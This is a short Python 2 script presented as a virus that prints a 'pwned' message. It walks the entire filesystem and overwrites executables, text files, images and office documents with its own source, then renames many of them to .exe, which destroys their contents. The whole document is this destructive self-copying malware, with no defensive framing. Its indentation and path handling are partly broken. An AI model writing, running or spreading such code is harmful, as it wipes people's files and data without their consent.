import os
import sys

def attack():
    print "You have been pwned, ByePy :)" 
    curdir = os.getcwd()
    with open(sys.argv[0], 'rb') as virus: 
        virus_code = virus.read()           
    os.chdir("/") 
    for dir,b,c in os.walk(os.getcwd()): 
        for file in c: 
            targ = dir+"\\"+file
            try:
                if ".exe" in file and file != sys.argv[0]: 
                    with open(targ, 'wb') as target: 
                        target.write(virus_code) 
		elif ".txt" in file or ".png" in file or ".jpg" in file or ".doc" in file or ".ppt" in file or ".xls" in file or ".jpeg" in file or ".gif" in file:
		    with open(targ, 'wb') as target:
			target.write(virus_code)
		    os.rename(file, file+".exe")	
            except:
                pass
if __name__ == "__main__":
    attack()
